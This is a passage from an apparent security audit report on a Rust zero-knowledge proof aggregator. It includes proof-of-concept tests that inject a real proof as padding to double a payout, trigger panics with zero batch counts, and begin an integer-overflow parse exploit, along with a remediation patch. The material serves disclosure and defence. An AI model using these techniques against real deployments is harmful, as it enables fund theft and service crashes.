        out[4 + j] = F::from_canonical_u64(nullifier[j]);
        out[8 + j] = F::from_canonical_u64(exit1[j]);
        out[12 + j] = F::from_canonical_u64(exit2[j]);
        out[16 + j] = F::from_canonical_u64(block_hash[j]);
    }
    out[20] = F::from_canonical_u64(block_number as u64);
    out
}

fn prove_private_batch(
    leaf_common: &CommonCircuitData<F, D>,
    leaf_verifier_only: &VerifierOnly,
    leaf_proofs: Vec<Proof>,
) -> (Proof, CommonCircuitData<F, D>, VerifierOnly) {
    let circuit = PrivateBatchCircuit::new(
        CircuitConfig::standard_recursion_config(),
        leaf_common,
        leaf_verifier_only,
        1,
    );
    let targets: PrivateBatchCircuitTargets = circuit.targets();
    let circuit_data: CircuitData<F, C, D> = circuit.build_circuit();

    let mut pw = PartialWitness::new();
    fill_private_batch_witness(
        &mut pw,
        &targets,
        &leaf_proofs,
        &vec![[
            F::from_canonical_u64(1001),
            F::from_canonical_u64(1002),
            F::from_canonical_u64(1003),
            F::from_canonical_u64(1004),
        ]],
    )
    .expect("private-batch witness fill should succeed");

    let proof = circuit_data
        .prove(pw)
        .expect("private-batch proof should succeed");
    circuit_data
        .verify(proof.clone())
        .expect("private-batch proof should verify");

    (proof, circuit_data.common.clone(), circuit_data.verifier_only.clone())
}

#[test]
fn unchecked_dummy_padding_duplicates_real_private_batch_outputs() {
    let block_hash = [0xAA01_u64, 0xAA02, 0xAA03, 0xAA04];
    let block_number = 42_u32;
    let aggregator_address = BytesDigest::try_from([42u8; 32]).expect("valid aggregator address");

    let (leaf_data, leaf_targets) = build_fake_leaf_circuit();
    let real_leaf = prove_fake_leaf(
        &leaf_data,
        &leaf_targets,
        make_leaf_pi(
            123,
            45,
            [1, 2, 3, 4],
            [5, 6, 7, 8],
            [0x10, 0x11, 0x12, 0x13],
            block_hash,
            block_number,
        ),
    );

    let (malicious_private_batch_proof, private_batch_common, private_batch_verifier_only) =
        prove_private_batch(&leaf_data.common, &leaf_data.verifier_only, vec![real_leaf]);
    let malicious_private_batch_pis =
        PrivateBatchPublicInputs::try_from_u64_slice(&proof_u64s(&malicious_private_batch_proof))
            .expect("private-batch public inputs should parse");

    assert_ne!(
        malicious_private_batch_pis.block_data.block_hash,
        BytesDigest::default(),
        "malicious padding template must be a non-dummy private-batch proof"
    );
    assert!(
        malicious_private_batch_pis
            .account_data
            .iter()
            .any(|slot| slot.summed_output_amount > 0),
        "malicious padding template must carry non-zero exits"
    );

    let public_batch_prover_data = PublicBatchCircuit::new(
        CircuitConfig::standard_recursion_config(),
        private_batch_common.clone(),
        &private_batch_verifier_only,
        2,
        1,
    )
    .build_prover();
    let public_batch_verifier = PublicBatchCircuit::new(
        CircuitConfig::standard_recursion_config(),
        private_batch_common.clone(),
        &private_batch_verifier_only,
        2,
        1,
    )
    .build_verifier();

    let gate_serializer = DefaultGateSerializer;
    let generator_serializer = DefaultGeneratorSerializer::<C, D> {
        _phantom: Default::default(),
    };

    let public_batch_common_bytes = public_batch_prover_data
        .common
        .to_bytes(&gate_serializer)
        .expect("serialize public-batch common");
    let public_batch_prover_only_bytes = public_batch_prover_data
        .prover_only
        .to_bytes(&generator_serializer, &public_batch_prover_data.common)
        .expect("serialize public-batch prover-only");
    let private_batch_common_bytes = private_batch_common
        .to_bytes(&gate_serializer)
        .expect("serialize private-batch common");
    let private_batch_verifier_only_bytes = private_batch_verifier_only
        .to_bytes()
        .expect("serialize private-batch verifier-only");

    let prover = PublicBatchProver::new_from_bytes(
        &public_batch_prover_only_bytes,
        &public_batch_common_bytes,
        &private_batch_common_bytes,
        &private_batch_verifier_only_bytes,
        &malicious_private_batch_proof.to_bytes(),
        (1, 2),
    )
    .expect("vulnerable loader should accept a real private-batch proof as dummy padding");

    let public_batch_proof = prover
        .commit(PublicBatchInputs {
            proofs: vec![malicious_private_batch_proof.clone()],
            aggregator_address,
        })
        .expect("partial public batch should be padded with the injected template")
        .prove()
        .expect("public-batch prove should succeed with poisoned padding");

    public_batch_verifier
        .verify(public_batch_proof.clone())
        .expect("poisoned public-batch proof should still verify");

    let parsed = PublicBatchPublicInputs::try_from_u64_slice(&proof_u64s(&public_batch_proof), 2, 1)
        .expect("public-batch public inputs should parse");

    assert_eq!(parsed.aggregator_address, aggregator_address);
    assert_eq!(parsed.asset_id, malicious_private_batch_pis.asset_id);
    assert_eq!(parsed.volume_fee_bps, malicious_private_batch_pis.volume_fee_bps);
    assert_eq!(parsed.block_data, malicious_private_batch_pis.block_data);

    let first_inner_slots = &parsed.account_data[..2];
    let padded_inner_slots = &parsed.account_data[2..4];
    assert_eq!(
        first_inner_slots,
        malicious_private_batch_pis.account_data.as_slice(),
        "the explicit inner proof should occupy the first public segment"
    );
    assert_eq!(
        padded_inner_slots,
        malicious_private_batch_pis.account_data.as_slice(),
        "padding should forward the injected real private-batch exits instead of zeroing them"
    );
    assert!(
        padded_inner_slots
            .iter()
            .any(|slot| slot.summed_output_amount > 0),
        "the padded segment should carry a non-zero payout"
    );

    let first_inner_nullifiers = &parsed.nullifiers[..1];
    let padded_inner_nullifiers = &parsed.nullifiers[1..2];
    assert_eq!(
        first_inner_nullifiers,
        malicious_private_batch_pis.nullifiers.as_slice(),
        "the explicit inner proof should occupy the first nullifier segment"
    );
    assert_eq!(
        padded_inner_nullifiers,
        malicious_private_batch_pis.nullifiers.as_slice(),
        "padding should duplicate the injected real private-batch nullifier"
    );

    let intended_total: u32 = malicious_private_batch_pis
        .account_data
        .iter()
        .map(|slot| slot.summed_output_amount)
        .sum();
    let actual_total: u32 = parsed
        .account_data
        .iter()
        .map(|slot| slot.summed_output_amount)
        .sum();
    assert_eq!(
        actual_total,
        intended_total * 2,
        "the poisoned padding template should double the forwarded payout in a partial public batch"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 28 lines & 0.94921875 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.08s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC executes the real vulnerable `PublicBatchProver::new_from_bytes` and `commit` paths and proves/verifies a native public-batch proof, but it uses the repo’s in-process fake-leaf test circuit to generate a valid non-dummy private-batch proof quickly instead of the full Wormhole leaf prover pipeline. It demonstrates duplicated forwarded exits/nullifiers and doubled aggregate payout in the public-batch output; it does not execute downstream settlement logic.

### Validation reasoning

PoC validation command completed successfully.

---

# Zero batch sizes panic
**#97027**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/public_batch/prover/lib.rs` (3 locations)
#### Lines 60-74 — _The direct constructor forwards raw proof-count parameters into the circuit builder._

```
    pub fn new(
        public_batch_circuit_config: CircuitConfig,
        private_batch_common: CommonCircuitData<F, D>,
        private_batch_verifier_only: &VerifierOnlyCircuitData<C, D>,
        num_private_batch_proofs: usize,
        private_batch_num_leaves: usize,
        dummy_proof_template: ProofWithPublicInputs<F, C, D>,
    ) -> Self {
        let public_batch_circuit = PublicBatchCircuit::new(
            public_batch_circuit_config,
            private_batch_common,
            private_batch_verifier_only,
            num_private_batch_proofs,
            private_batch_num_leaves,
        );
```

⋯
#### Lines 89-96 — _The byte-loading constructor accepts a raw proof-count tuple while advertising a fallible `Result` API._

```
    pub fn new_from_bytes(
        public_batch_prover_only_bytes: &[u8],
        public_batch_common_bytes: &[u8],
        private_batch_common_bytes: &[u8],
        private_batch_verifier_only_bytes: &[u8],
        dummy_private_batch_proof_bytes: &[u8],
        config: (usize, usize), // (num_leaf_proofs, num_private_batch_proofs)
    ) -> Result<Self> {
```

⋯
#### Lines 121-129 — _The raw tuple values are passed directly to `PublicBatchCircuit::new` before validation._

```
        let (num_leaf_proofs, num_private_batch_proofs) = config;

        let circuit = PublicBatchCircuit::new(
            public_batch_common.config.clone(),
            private_batch_verifier_data.common.clone(),
            &private_batch_verifier_data.verifier_only,
            num_private_batch_proofs,
            num_leaf_proofs,
        );
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs`
#### Lines 48-59 — _The circuit builder enforces zero-count rejection with panicking `assert!` calls._

```
    pub fn new(
        config: CircuitConfig,
        private_batch_common: CommonCircuitData<F, D>,
        private_batch_verifier_only: &VerifierOnlyCircuitData<C, D>,
        n_inner: usize,
        private_batch_num_leaves: usize,
    ) -> Self {
        assert!(n_inner > 0, "n_inner must be > 0");
        assert!(
            private_batch_num_leaves > 0,
            "private_batch_num_leaves must be > 0"
        );
```

### `wormhole/aggregator/src/config.rs`
#### Lines 48-70 — _Only the config loader's validation path rejects zero counts recoverably; direct constructors bypass it._

```
    pub fn validate(&self) -> Result<()> {
        if self.num_leaf_proofs == 0 {
            bail!("num_leaf_proofs must be > 0");
        }
        if self.num_leaf_proofs > MAX_PROOF_COUNT {
            bail!(
                "num_leaf_proofs ({}) exceeds maximum allowed ({})",
                self.num_leaf_proofs,
                MAX_PROOF_COUNT
            );
        }
        if let Some(n) = self.num_private_batch_proofs {
            if n == 0 {
                bail!("num_private_batch_proofs must be > 0 when specified");
            }
            if n > MAX_PROOF_COUNT {
                bail!(
                    "num_private_batch_proofs ({}) exceeds maximum allowed ({})",
                    n,
                    MAX_PROOF_COUNT
                );
            }
        }
```

## Description

The public-batch prover constructors expose raw proof-count parameters that are used to rebuild the target layout before any fallible validation. `new_from_bytes` is a `Result`-returning API, but after unpacking `(num_leaf_proofs, num_private_batch_proofs)` it passes both values directly into `PublicBatchCircuit::new`; the fresh `new` constructor does the same with `num_private_batch_proofs` and `private_batch_num_leaves`. `PublicBatchCircuit::new` enforces these bounds with `assert!`, not with a recoverable error, so a zero count aborts the caller instead of producing `Err`. The binaries-directory path validates `config.json`, but direct byte and direct constructor callers bypass that validation entirely. Any service that lets untrusted jobs provide these constructor parameters can be crashed with a malformed zero-count request.

## Root cause

Raw batch-size parameters are forwarded into an asserting circuit builder instead of being validated at the public API boundary and converted to `anyhow::Error`. The fallible byte-loading constructor therefore contains panic paths for malformed caller-controlled configuration.

## Impact

A malformed public-batch proving request can terminate or panic the prover process before proof generation begins. This creates a reliable availability failure for proof-generation services that expose the byte-loading API or wrap the direct constructor around caller-supplied batch sizes.

## Proof of concept

### Test case

```
use circuit_builder::generate_all_circuit_binaries;
use std::panic::{catch_unwind, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};
use wormhole_aggregator::public_batch::prover::PublicBatchProver;

fn poc_bins_dir() -> &'static Path {
    static BINS_DIR: OnceLock<PathBuf> = OnceLock::new();

    BINS_DIR.get_or_init(|| {
        let suffix = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system time before unix epoch")
            .as_nanos();
        let dir = std::env::temp_dir().join(format!("qp-wormhole-public-batch-poc-{suffix}"));

        generate_all_circuit_binaries(&dir, true, 1, Some(1))
            .expect("failed to generate public-batch test binaries");

        dir
    })
}

fn read_bins_file(name: &str) -> Vec<u8> {
    std::fs::read(poc_bins_dir().join(name)).expect("failed to read generated circuit artifact")
}

#[test]
fn public_batch_new_from_bytes_panics_on_zero_config_instead_of_returning_err() {
    let public_batch_prover_only_bytes = read_bins_file("public_batch_prover.bin");
    let public_batch_common_bytes = read_bins_file("public_batch_common.bin");
    let private_batch_common_bytes = read_bins_file("private_batch_common.bin");
    let private_batch_verifier_only_bytes = read_bins_file("private_batch_verifier.bin");
    let dummy_private_batch_proof_bytes = read_bins_file("dummy_private_batch_proof.bin");

    let zero_leaf_count = catch_unwind(AssertUnwindSafe(|| {
        let _ = PublicBatchProver::new_from_bytes(
            &public_batch_prover_only_bytes,
            &public_batch_common_bytes,
            &private_batch_common_bytes,
            &private_batch_verifier_only_bytes,
            &dummy_private_batch_proof_bytes,
            (0, 1),
        );
    }));
    assert!(
        zero_leaf_count.is_err(),
        "zero num_leaf_proofs should not abort the Result-returning constructor"
    );

    let zero_private_batch_count = catch_unwind(AssertUnwindSafe(|| {
        let _ = PublicBatchProver::new_from_bytes(
            &public_batch_prover_only_bytes,
            &public_batch_common_bytes,
            &private_batch_common_bytes,
            &private_batch_verifier_only_bytes,
            &dummy_private_batch_proof_bytes,
            (1, 0),
        );
    }));
    assert!(
        zero_private_batch_count.is_err(),
        "zero num_private_batch_proofs should not abort the Result-returning constructor"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 115 lines & 7.1201171875 KB skipped]
             at ./tests/poc.rs:52:36
  12: poc::public_batch_new_from_bytes_panics_on_zero_config_instead_of_returning_err::{{closure}}
             at ./tests/poc.rs:30:80
  13: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
  14: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.

</test-stderr>
```

### Considerations

PoC executed the real `PublicBatchProver::new_from_bytes` path with runtime-generated public/private-batch artifacts and proved both zero-count inputs panic inside `PublicBatchCircuit::new`. It captures the panic with `catch_unwind` so the test can assert the failure; a production wrapper that does not catch unwinds would be crashed/aborted instead. The sibling `PublicBatchProver::new` constructor was not exercised separately because `new_from_bytes` reaches the same vulnerable builder and demonstrates the reported Result-API panic path.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Validate public-batch proof-count parameters at PublicBatchProver constructor boundaries using existing CircuitBinsConfig checks, converting zero/oversized caller-supplied batch sizes into recoverable errors before PublicBatchCircuit::new can assert and panic.

### Patch

```diff
diff --git a/wormhole/aggregator/src/public_batch/prover/lib.rs b/wormhole/aggregator/src/public_batch/prover/lib.rs
--- a/wormhole/aggregator/src/public_batch/prover/lib.rs
+++ b/wormhole/aggregator/src/public_batch/prover/lib.rs
@@ -1,267 +1,279 @@
 //! Public-batch aggregation prover (prebuilt-circuit proving API).
 //!
 //! The private-batch verifier key is baked in as constants at circuit build time to prevent
 //! verifier key substitution attacks.
 
 use anyhow::{anyhow, bail, Context, Result};
 #[cfg(feature = "std")]
 use plonky2::{
     iop::witness::PartialWitness,
     plonk::{
         circuit_data::{
             CircuitConfig, CommonCircuitData, ProverCircuitData, ProverOnlyCircuitData,
             VerifierOnlyCircuitData,
         },
         proof::ProofWithPublicInputs,
     },
     util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
 };
 use qp_wormhole_inputs::BytesDigest;
 
 #[cfg(feature = "std")]
 use std::{fs, path::Path};
 
 use zk_circuits_common::{
     circuit::{C, D, F},
     utils::bytes_to_digest,
 };
 
 use crate::{
     common::utils::load_verifier_data_from_bytes,
     public_batch::{
         circuit::circuit_logic::{PublicBatchCircuit, PublicBatchCircuitTargets},
         prover::witness::fill_public_batch_witness,
     },
+    CircuitBinsConfig,
 };
 
 #[derive(Debug)]
 pub struct PublicBatchInputs {
     pub proofs: Vec<ProofWithPublicInputs<F, C, D>>,
     pub aggregator_address: BytesDigest,
 }
 
 #[derive(Debug)]
 pub struct PublicBatchProver {
     pub circuit_data: ProverCircuitData<F, C, D>,
     partial_witness: PartialWitness<F>,
     targets: Option<PublicBatchCircuitTargets>,
     num_private_batch_proofs: usize,
     /// Dummy private-batch proof (over all-dummy leaves, `block_hash == 0`) used to
     /// pad partial public batches. The circuit zeroes dummy inners' exit slots and
     /// nullifiers, so one template can fill several slots without collisions.
     dummy_proof_template: ProofWithPublicInputs<F, C, D>,
 }
 
 impl PublicBatchProver {
+    fn validate_config(
+        num_private_batch_proofs: usize,
+        private_batch_num_leaves: usize,
+    ) -> Result<()> {
+        CircuitBinsConfig::new(private_batch_num_leaves, Some(num_private_batch_proofs))?;
+        Ok(())
+    }
+
     /// Build a fresh public-batch aggregation prover from circuit definitions.
     ///
     /// In production, prefer `new_from_binaries_dir(...)` to load prebuilt circuits.
     #[allow(clippy::too_many_arguments)]
     pub fn new(
         public_batch_circuit_config: CircuitConfig,
         private_batch_common: CommonCircuitData<F, D>,
         private_batch_verifier_only: &VerifierOnlyCircuitData<C, D>,
         num_private_batch_proofs: usize,
         private_batch_num_leaves: usize,
         dummy_proof_template: ProofWithPublicInputs<F, C, D>,
-    ) -> Self {
+    ) -> Result<Self> {
+        Self::validate_config(num_private_batch_proofs, private_batch_num_leaves)?;
+
         let public_batch_circuit = PublicBatchCircuit::new(
             public_batch_circuit_config,
             private_batch_common,
             private_batch_verifier_only,
             num_private_batch_proofs,
             private_batch_num_leaves,
         );
 
         let targets = Some(public_batch_circuit.targets());
         let circuit_data = public_batch_circuit.build_prover();
 
-        Self {
+        Ok(Self {
             circuit_data,
             partial_witness: PartialWitness::new(),
             targets,
             num_private_batch_proofs,
             dummy_proof_template,
-        }
+        })
     }
 
     /// Create a public-batch prover from serialized bytes.
     pub fn new_from_bytes(
         public_batch_prover_only_bytes: &[u8],
         public_batch_common_bytes: &[u8],
         private_batch_common_bytes: &[u8],
         private_batch_verifier_only_bytes: &[u8],
         dummy_private_batch_proof_bytes: &[u8],
         config: (usize, usize), // (num_leaf_proofs, num_private_batch_proofs)
     ) -> Result<Self> {
+        let (num_leaf_proofs, num_private_batch_proofs) = config;
+        Self::validate_config(num_private_batch_proofs, num_leaf_proofs)?;
+
         let gate_serializer = DefaultGateSerializer;
         let generator_serializer = DefaultGeneratorSerializer::<C, D> {
             _phantom: Default::default(),
         };
 
         // 1) Load prebuilt public-batch circuit prover data
         let public_batch_common =
             CommonCircuitData::from_bytes(public_batch_common_bytes.to_vec(), &gate_serializer)
                 .map_err(|e| anyhow!("failed to deserialize public_batch common data: {}", e))?;
 
         let public_batch_prover_only = ProverOnlyCircuitData::from_bytes(
             public_batch_prover_only_bytes,
             &generator_serializer,
             &public_batch_common,
         )
         .map_err(|e| anyhow!("failed to deserialize public_batch prover data: {}", e))?;
 
         // 2) Load private-batch verifier data (needed for witness filling and dummy proof parsing)
         let private_batch_verifier_data = load_verifier_data_from_bytes(
             private_batch_common_bytes,
             private_batch_verifier_only_bytes,
             "private_batch",
         )?;
 
-        let (num_leaf_proofs, num_private_batch_proofs) = config;
-
         let circuit = PublicBatchCircuit::new(
             public_batch_common.config.clone(),
             private_batch_verifier_data.common.clone(),
             &private_batch_verifier_data.verifier_only,
             num_private_batch_proofs,
             num_leaf_proofs,
         );
 
         let targets = Some(circuit.targets());
 
         // 3) Load the dummy private-batch proof template used to pad partial batches
         let dummy_proof_template = ProofWithPublicInputs::<F, C, D>::from_bytes(
             dummy_private_batch_proof_bytes.to_vec(),
             &private_batch_verifier_data.common,
         )
         .map_err(|e| anyhow!("failed to deserialize dummy private-batch proof: {}", e))?;
 
         Ok(Self {
             circuit_data: ProverCircuitData {
                 prover_only: public_batch_prover_only,
                 common: public_batch_common,
             },
             partial_witness: PartialWitness::new(),
             targets,
             num_private_batch_proofs,
             dummy_proof_template,
         })
     }
 
     #[cfg(feature = "std")]
     #[allow(clippy::too_many_arguments)]
     pub fn new_from_files(
         public_batch_prover_path: &Path,
         public_batch_common_path: &Path,
         private_batch_common_path: &Path,
         private_batch_verifier_path: &Path,
         dummy_private_batch_proof_path: &Path,
         config: (usize, usize),
     ) -> Result<Self> {
         let public_batch_prover_only_bytes = fs::read(public_batch_prover_path)
             .with_context(|| format!("Failed to read {:?}", public_batch_prover_path))?;
         let public_batch_common_bytes = fs::read(public_batch_common_path)
             .with_context(|| format!("Failed to read {:?}", public_batch_common_path))?;
 
         let private_batch_common_bytes = fs::read(private_batch_common_path)
             .with_context(|| format!("Failed to read {:?}", private_batch_common_path))?;
         let private_batch_verifier_only_bytes = fs::read(private_batch_verifier_path)
             .with_context(|| format!("Failed to read {:?}", private_batch_verifier_path))?;
         let dummy_private_batch_proof_bytes = fs::read(dummy_private_batch_proof_path)
             .with_context(|| format!("Failed to read {:?}", dummy_private_batch_proof_path))?;
 
         Self::new_from_bytes(
             &public_batch_prover_only_bytes,
             &public_batch_common_bytes,
             &private_batch_common_bytes,
             &private_batch_verifier_only_bytes,
             &dummy_private_batch_proof_bytes,
             config,
         )
     }
 
     /// Convenience constructor from a generated binaries directory.
     ///
     /// Expected files:
     /// - `public_batch_prover.bin`
     /// - `public_batch_common.bin`
     /// - `private_batch_common.bin`             (private-batch common)
     /// - `private_batch_verifier.bin`           (private-batch verifier-only)
     /// - `dummy_private_batch_proof.bin`        (padding template)
     /// - `config.json`
     ///
     #[cfg(feature = "std")]
     pub fn new_from_binaries_dir(bins_dir: &Path) -> Result<Self> {
         let bins_config = crate::config::CircuitBinsConfig::load(bins_dir)?;
 
         let num_private_batch_proofs = bins_config.num_private_batch_proofs.ok_or_else(|| {
             anyhow!(
                 "config is missing num_private_batch_proofs. Regenerate binaries with num_private_batch_proofs set."
             )
         })?;
         let config = (bins_config.num_leaf_proofs, num_private_batch_proofs);
 
         Self::new_from_files(
             &bins_dir.join("public_batch_prover.bin"),
             &bins_dir.join("public_batch_common.bin"),
             &bins_dir.join("private_batch_common.bin"),
             &bins_dir.join("private_batch_verifier.bin"),
             &bins_dir.join("dummy_private_batch_proof.bin"),
             config,
         )
     }
 
     pub fn num_private_batch_proofs(&self) -> usize {
         self.num_private_batch_proofs
     }
 
     /// Commit private-batch aggregated proofs into the public-batch circuit witness.
     ///
     /// Partial batches are padded with the dummy private-batch proof template.
     /// The circuit exempts dummies (`block_hash == 0`) from metadata consistency
     /// and zeroes their forwarded exit slots and nullifiers.
     pub fn commit(mut self, inputs: PublicBatchInputs) -> Result<Self> {
         let Some(targets) = self.targets.take() else {
             bail!("public-batch aggregation prover has already committed to inputs");
         };
 
         let mut proofs = inputs.proofs;
         let aggregator_address = inputs.aggregator_address;
 
         let aggregator_address_felts = bytes_to_digest(aggregator_address);
 
         if proofs.is_empty() {
             bail!("no private-batch proofs to aggregate");
         }
         if proofs.len() > self.num_private_batch_proofs {
             bail!(
                 "Expected at most {} private-batch proofs, but got {}",
                 self.num_private_batch_proofs,
                 proofs.len()
             );
         }
 
         // Pad partial batches with the dummy template. No shuffle: forwarding is
         // order-preserving by design (per-segment attribution on-chain).
         let num_dummies_needed = self.num_private_batch_proofs - proofs.len();
         for _ in 0..num_dummies_needed {
             proofs.push(self.dummy_proof_template.clone());
         }
 
         fill_public_batch_witness(
             &mut self.partial_witness,
             &targets,
             &proofs,
             aggregator_address_felts,
         )?;
 
         Ok(self)
     }
 
     pub fn prove(self) -> Result<ProofWithPublicInputs<F, C, D>> {
         self.circuit_data
             .prove(self.partial_witness)
             .map_err(|e| anyhow!("Failed to prove public-batch aggregation circuit: {}", e))
     }
 }
```

### Affected files
- `wormhole/aggregator/src/public_batch/prover/lib.rs`

### Validation output

```
[output truncated: 49 lines & 2.849609375 KB skipped]
   2: poc::public_batch_new_from_bytes_panics_on_zero_config_instead_of_returning_err
             at ./tests/poc.rs:47:5
   3: poc::public_batch_new_from_bytes_panics_on_zero_config_instead_of_returning_err::{{closure}}
             at ./tests/poc.rs:30:80
   4: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   5: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Unchecked batch counts overflow
**#97052**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/inputs/src/lib.rs` (3 locations)
#### Lines 248-263 — _Public helper computes public-batch length with unchecked multiplication and addition._

```
    #[inline]
    pub const fn exit_slots_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs * 2
    }

    #[inline]
    pub const fn nullifiers_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs
    }

    #[inline]
    pub const fn pi_len(num_private_batch_proofs: usize, num_leaf_proofs: usize) -> usize {
        HEADER_LEN
            + num_private_batch_proofs * exit_slots_per_inner(num_leaf_proofs) * EXIT_SLOT_LEN
            + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * 4
    }
```

⋯
#### Lines 494-520 — _Parser accepts raw count parameters, checks only nonzero and the potentially wrapped expected length, then truncates total exit slots to u32._

```
    pub fn try_from_u64_slice(
        pis: &[u64],
        num_private_batch_proofs: usize,
        num_leaf_proofs: usize,
    ) -> anyhow::Result<Self> {
        use public_batch_pi::{
            exit_slots_per_inner, nullifiers_per_inner, pi_len, AGGREGATOR_ADDRESS_LEN, HEADER_LEN,
        };

        if num_private_batch_proofs == 0 || num_leaf_proofs == 0 {
            bail!("PublicBatchPI: num_private_batch_proofs and num_leaf_proofs must be > 0");
        }

        let expected_len = pi_len(num_private_batch_proofs, num_leaf_proofs);
        if pis.len() != expected_len {
            bail!(
                "PublicBatchPI: expected {} felts (n_inner={}, n_leaves={}), got {}",
                expected_len,
                num_private_batch_proofs,
                num_leaf_proofs,
                pis.len()
            );
        }

        let slots_per_inner = exit_slots_per_inner(num_leaf_proofs);
        let nulls_per_inner = nullifiers_per_inner(num_leaf_proofs);
        let total_exit_slots_expected = (num_private_batch_proofs * slots_per_inner) as u32;
```

⋯
#### Lines 554-582 — _Unchecked products drive vector capacities and parsing loops; the final cursor check is debug-only._

```
        let mut cursor = HEADER_LEN;
        let total_slots = num_private_batch_proofs * slots_per_inner;
        let mut account_data = Vec::with_capacity(total_slots);
        for i in 0..total_slots {
            let summed_output_amount: u32 = pis[cursor]
                .try_into()
                .with_context(|| format!("PublicBatchPI: exit slot {} sum exceeds u32", i))?;
            cursor += 1;

            let exit_account = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                .with_context(|| format!("PublicBatchPI: parsing exit slot {} account", i))?;
            cursor += 4;

            account_data.push(PublicInputsByAccount {
                summed_output_amount,
                exit_account,
            });
        }

        let total_nullifiers = num_private_batch_proofs * nulls_per_inner;
        let mut nullifiers = Vec::with_capacity(total_nullifiers);
        for i in 0..total_nullifiers {
            let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                .with_context(|| format!("PublicBatchPI: parsing nullifier {}", i))?;
            cursor += 4;
            nullifiers.push(n);
        }

        debug_assert_eq!(cursor, expected_len);
```

### `wormhole/verifier/src/lib.rs`
#### Lines 77-88 — _Verifier-facing wrapper exposes the count parameters directly to callers of public-batch parsing._

```
/// Parse public-batch public inputs from a proof.
pub fn parse_public_batch_public_inputs(
    proof: &ProofWithPublicInputs<F, C, D>,
    num_private_batch_proofs: usize,
    num_leaf_proofs: usize,
) -> anyhow::Result<PublicBatchPublicInputs> {
    let u64s: Vec<u64> = proof
        .public_inputs
        .iter()
        .map(|f| f.to_canonical_u64())
        .collect();
    PublicBatchPublicInputs::try_from_u64_slice(&u64s, num_private_batch_proofs, num_leaf_proofs)
```

## Description

`PublicBatchPublicInputs::try_from_u64_slice` accepts `num_private_batch_proofs` and `num_leaf_proofs` as ordinary caller-supplied `usize` values, but all layout calculations use unchecked `usize` multiplication and addition. The helper `public_batch_pi::pi_len` computes `HEADER_LEN + n_inner * n_leaves * ...` without a checked bound, and the parser then trusts that potentially wrapped `expected_len` before deriving loop counts and vector capacities from the same unbounded parameters. A caller can choose very large counts whose products wrap to a small `expected_len`, allowing a tiny `pis` slice to pass the length check while later counts either request enormous `Vec::with_capacity` allocations or wrap to zero and return an empty parsed batch. The final cursor validation is only a `debug_assert_eq!`, so release builds do not enforce that the runtime traversal matched the checked public-input length. The verifier crate exposes these counts directly through `parse_public_batch_public_inputs`, so services that parse user-submitted public-batch proofs with untrusted or misconfigured count parameters can be crashed or fed a silently malformed parse result before any typed error is returned.

## Root cause

The parser treats public-batch proof counts as trusted circuit configuration but exposes them as raw `usize` parameters and performs layout arithmetic with unchecked multiplication, addition, truncating casts, and a debug-only cursor assertion.

## Impact

An attacker who can influence the public-batch count parameters can turn a small public-input slice into a panic, capacity-overflow, or out-of-memory abort in a verifier/parser process. In wrapping cases, the same parser can also accept a 12-felt header as an apparently valid huge batch with empty account and nullifier vectors, weakening downstream accounting that trusts the parsed structure.

## Proof of concept

### Test case

```
use plonky2::field::types::Field;
use plonky2::plonk::circuit_data::CircuitConfig;
use plonky2::util::serialization::DefaultGateSerializer;
use qp_wormhole_inputs::public_batch_pi::HEADER_LEN;
use test_helpers::TestInputs;
use wormhole_circuit::{circuit::circuit_logic::WormholeCircuit, inputs::CircuitInputs};
use wormhole_prover::WormholeProver;
use wormhole_verifier::{parse_public_batch_public_inputs, F, ProofWithPublicInputs, WormholeVerifier};

#[cfg(target_pointer_width = "64")]
fn forged_header_only_public_batch_proof() -> ProofWithPublicInputs<F, wormhole_verifier::C, { wormhole_verifier::D }> {
    let config = CircuitConfig::standard_recursion_config();
    let prover = WormholeProver::new(config.clone());
    let proof = prover
        .commit(&CircuitInputs::test_inputs_0())
        .expect("commit test inputs")
        .prove()
        .expect("prove test inputs");

    let verifier_data = WormholeCircuit::new(config).build_verifier();
